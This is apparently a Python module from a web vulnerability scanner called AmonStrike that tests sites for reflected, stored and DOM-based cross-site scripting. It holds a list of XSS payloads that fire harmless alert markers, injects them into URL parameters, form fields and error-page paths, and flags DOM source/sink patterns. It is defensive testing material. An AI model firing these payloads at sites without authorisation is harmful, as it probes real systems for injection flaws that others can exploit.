"""
AmonStrike — XSS Module
Tests for Reflected, Stored, and DOM-based XSS.
"""

import re
from urllib.parse import urljoin, parse_qs, urlparse
from .base import BaseModule


class XssModule(BaseModule):
    NAME        = "xss"
    DESCRIPTION = "Cross-Site Scripting — reflected, stored, DOM-based"

    # XSS Payloads with unique markers for detection
    PAYLOADS = [
        ('<script>alert("AMONSTRIKE_XSS")</script>', "Basic script tag"),
        ('<img src=x onerror=alert("AMONSTRIKE_XSS")>', "IMG onerror"),
        ('<svg onload=alert("AMONSTRIKE_XSS")>', "SVG onload"),
        ('"><script>alert("AMONSTRIKE_XSS")</script>', "Break out of attribute"),
        ("'><script>alert('AMONSTRIKE_XSS')</script>", "Single quote break"),
        ('<body onload=alert("AMONSTRIKE_XSS")>', "Body onload"),
        ('javascript:alert("AMONSTRIKE_XSS")', "JavaScript URI"),
        ('<iframe src="javascript:alert(\'AMONSTRIKE_XSS\')"></iframe>', "iframe"),
        ('<input onfocus=alert("AMONSTRIKE_XSS") autofocus>', "Input autofocus"),
        ('<details open ontoggle=alert("AMONSTRIKE_XSS")>', "Details ontoggle"),
        # Encoded variants
        ('&lt;script&gt;alert("AMONSTRIKE_XSS")&lt;/script&gt;', "HTML encoded"),
        ('%3Cscript%3Ealert("AMONSTRIKE_XSS")%3C/script%3E', "URL encoded"),
    ]

    MARKER = "AMONSTRIKE_XSS"

    def run(self):
        self.log("Testing for Cross-Site Scripting (XSS)...")

        resp = self.get()
        if not resp:
            return self.result()

        self._test_url_params(resp)
        self._test_forms(resp)
        self._check_dom_sources(resp)
        self._check_reflected_in_error(resp)

        self.log(f"XSS scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _is_reflected(self, response_text, payload):
        """Check if payload is reflected in response."""
        # Check for unencoded reflection
        if self.MARKER in response_text:
            return True
        # Check for partial reflection (tag broken)
        if "<script>" in payload and "<script>" in response_text:
            return True
        if "onerror" in payload and "onerror" in response_text:
            return True
        return False

    def _test_url_params(self, resp):
        """Test URL parameters for reflected XSS."""
        parsed = urlparse(self.url)
        params = parse_qs(parsed.query)

        if not params:
            # Try common parameter names
            test_params = ["q", "search", "name", "s", "query", "keyword", "term", "msg", "message"]
            for param in test_params:
                self._test_param_xss(param, "test")
            return

        for param, values in params.items():
            self._test_param_xss(param, values[0])

    def _test_param_xss(self, param, original):
        """Test a single parameter for XSS."""
        for payload, desc in self.PAYLOADS[:8]:
            resp = self.get(params={param: payload})
            if resp and self._is_reflected(resp.text, payload):
                self.add_finding(
                    title=f"Reflected XSS — Parameter: {param}",
                    severity="HIGH",
                    description=f"Reflected Cross-Site Scripting in parameter '{param}'. User input is reflected in the response without proper encoding.",
                    evidence=f"Parameter: {param}\nPayload: {payload}\nType: {desc}\nReflected in response: YES",
                    remediation="Encode all user input before rendering in HTML. Use Content-Security-Policy. Implement input validation.",
                    url=resp.url if resp else self.url,
                    cve="CWE-79"
                )
                return  # One finding per parameter is enough

    def _test_forms(self, resp):
        """Test form inputs for XSS."""
        try:
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(resp.text, "html.parser")
            forms = soup.find_all("form")

            for form in forms:
                action = form.get("action", "")
                method = form.get("method", "get").lower()
                form_url = urljoin(self.url, action) if action else self.url

                inputs = {}
                for inp in form.find_all(["input", "textarea"]):
                    name = inp.get("name", "")
                    itype = inp.get("type", "text").lower()
                    if name and itype not in ["submit", "button", "hidden", "file"]:
                        inputs[name] = "test"

                if not inputs:
                    continue

                for field in inputs:
                    for payload, desc in self.PAYLOADS[:6]:
                        test_data = dict(inputs)
                        test_data[field] = payload

                        if method == "post":
                            r = self.post(form_url.replace(self.url, ""), data=test_data)
                        else:
                            r = self.get(form_url.replace(self.url, ""), params=test_data)

                        if r and self._is_reflected(r.text, payload):
                            self.add_finding(
                                title=f"Reflected XSS in Form Field: {field}",
                                severity="HIGH",
                                description=f"XSS in form field '{field}' ({method.upper()} form).",
                                evidence=f"Form: {form_url}\nField: {field}\nPayload: {payload}",
                                remediation="HTML-encode all output. Use templating engines that auto-escape. Implement CSP.",
                                url=form_url,
                                cve="CWE-79"
                            )
                            break

        except ImportError:
            pass

    def _check_dom_sources(self, resp):
        """Check for dangerous DOM sinks and sources."""
        dom_sources = [
            r"document\.location",
            r"document\.URL",
            r"document\.documentURI",
            r"location\.href",
            r"location\.search",
            r"location\.hash",
            r"window\.name",
        ]
        dom_sinks = [
            r"document\.write\s*\(",
            r"document\.writeln\s*\(",
            r"innerHTML\s*=",
            r"outerHTML\s*=",
            r"eval\s*\(",
            r"setTimeout\s*\(",
            r"setInterval\s*\(",
            r"location\.href\s*=",
        ]

        found_sources = [s for s in dom_sources if re.search(s, resp.text)]
        found_sinks   = [s for s in dom_sinks   if re.search(s, resp.text)]

        if found_sources and found_sinks:
            self.add_finding(
                title="Potential DOM-Based XSS — Dangerous Source/Sink Pattern",
                severity="MEDIUM",
                description="JavaScript code uses user-controllable sources with potentially dangerous sinks. Manual review required to confirm exploitability.",
                evidence=f"Sources found: {', '.join(found_sources)}\nSinks found: {', '.join(found_sinks)}",
                remediation="Avoid writing user-controlled data to dangerous sinks. Use textContent instead of innerHTML. Sanitize DOM input.",
                url=self.url,
                cve="CWE-79"
            )

    def _check_reflected_in_error(self, resp):
        """Check if error pages reflect user input."""
        # Request a non-existent page with XSS payload in path
        payload = '<script>alert("AMONSTRIKE_XSS")</script>'
        r = self.get(f"/nonexistent{payload}")
        if r and self._is_reflected(r.text, payload):
            self.add_finding(
                title="XSS in Error Page",
                severity="HIGH",
                description="The error page reflects user input without encoding. XSS possible via crafted URL.",
                evidence=f"Path payload reflected in {r.status_code} error page.",
                remediation="Encode all reflected content in error pages. Use generic error messages.",
                url=self.url,
                cve="CWE-79"
            )
